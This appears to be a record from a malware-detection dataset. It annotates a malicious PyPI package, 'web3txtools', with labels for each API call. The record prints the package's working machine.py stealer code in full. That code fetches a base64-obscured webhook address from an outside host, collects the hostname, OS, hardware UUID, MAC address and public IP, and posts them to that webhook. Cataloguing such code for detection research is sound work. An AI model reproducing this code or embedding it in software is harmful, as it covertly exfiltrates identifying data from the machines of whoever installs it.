{
  "metadata": {
    "package_name": "web3txtools-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/web3txtools-1.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "machine.py",
      "code_snippets": [
        {
          "snippet": "import requests, wmi, subprocess, psutil, platform, json\nimport pythoncom\nimport base64\n\nhook = base64.b64decode(requests.get(\"https://mehmetaliii.pythonanywhere.com/webzuhurt\").text).decode()\n\ndef get_mac_address():\n    for interface, addrs in psutil.net_if_addrs().items():\n        if interface == \"Wi-Fi\":\n            for addr in addrs:\n                if addr.family == psutil.AF_LINK:\n                    mac = addr.address\n                    return mac\n\ndef machineinfo():\n    pythoncom.CoInitialize()\n\n    mem = psutil.virtual_memory()\n\n    c = wmi.WMI()\n    for gpu in c.Win32_DisplayConfiguration():\n        GPUm = gpu.Description.strip()\n\n    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\\n')[1].strip()\n    \n    reqip = requests.get(\"https://api.ipify.org/?format=json\").json()\n              \n    mac = get_mac_address()\n          \n    payload = {\n        \"embeds\": [\n            {\n                \"title\": \"Machine Info\",\n                \"username\": \"github.com/lawxsz\",\n                \"avatar_url\": \"https://cdn.discordapp.com/attachments/1073683220148785222/1077827511691530240/photo_2022-10-01_18-57-36.jpg\",\n                \"description\": \"Github.com/Lawxsz/make-u-own-stealer\",\n                \"fields\": [\n                    {\n                        \"name\": \":computer: PC\",\n                        \"value\": f\"`{platform.node()}`\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \":desktop: OS:\",\n                        \"value\": f\"`{platform.platform()}`\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \":wrench: RAM\",\n                        \"value\": f\"`{mem.total / 1024**3} GB`\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \":pager: GPU\",\n                        \"value\": f\"`{GPUm}`\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \":zap: CPU\",\n                        \"value\": f\"`{platform.processor()}`\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \":key: HWID\",\n                        \"value\": f\"`{current_machine_id}`\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \":label: MAC\",\n                        \"value\": f\"`{mac}`\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \":crossed_swords: IP\",\n                        \"value\": f\"`{reqip['ip']}`\",\n                        \"inline\": True\n                    }\n                ]\n            }\n        ]\n    }     \n\n    headers = {\n        \"Content-Type\": \"Application/Json\"\n    }\n    r = requests.post(hook, data=json.dumps(payload), headers=headers)\n",
          "triple_sequences": [
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "https://mehmetaliii.pythonanywhere.com/webzuhurt",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_bytes",
              "object": "requests.get(\"https://mehmetaliii.pythonanywhere.com/webzuhurt\").text",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "bytes.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "psutil.net_if_addrs()",
              "action_description": "Returns list of network interface indices and names",
              "action_id": "list_network_interfaces",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access network interface MAC address file",
              "intention_id": "access_network_interface_mac"
            },
            {
              "action_api": "pythoncom.CoInitialize()",
              "action_description": "Initializes COM library for use by calling thread",
              "action_id": "init_com_library",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access WMI interface",
              "intention_id": "access_wmi_interface"
            },
            {
              "action_api": "psutil.virtual_memory()",
              "action_description": "Retrieves system virtual memory statistics",
              "action_id": "get_virtual_memory",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "wmi.WMI()",
              "action_description": "Instantiates WMI interface for system management",
              "action_id": "instantiate_wmi",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access WMI interface",
              "intention_id": "access_wmi_interface"
            },
            {
              "action_api": "c.Win32_DisplayConfiguration()",
              "action_description": "Instantiates WMI interface for system management",
              "action_id": "instantiate_wmi",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "wmic csproduct get uuid",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Get hardware UUID",
              "intention_id": "get_hardware_uuid"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "https://api.ipify.org/?format=json",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "requests.get().json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "platform.node()",
              "action_description": "Retrieves machine node name",
              "action_id": "get_machine_node",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "platform.platform()",
              "action_description": "Retrieves platform information",
              "action_id": "get_platform_info",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "platform.processor()",
              "action_description": "Retrieves processor name",
              "action_id": "get_processor_name",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "payload",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "hook, data=json.dumps(payload), headers=headers",
              "object_description": "Webhook endpoint",
              "object_id": "webhook_endpoint",
              "intention_description": "Transmit environment data to remote server",
              "intention_id": "transmit_environment_data_server"
            }
          ]
        }
      ]
    }
  ]
}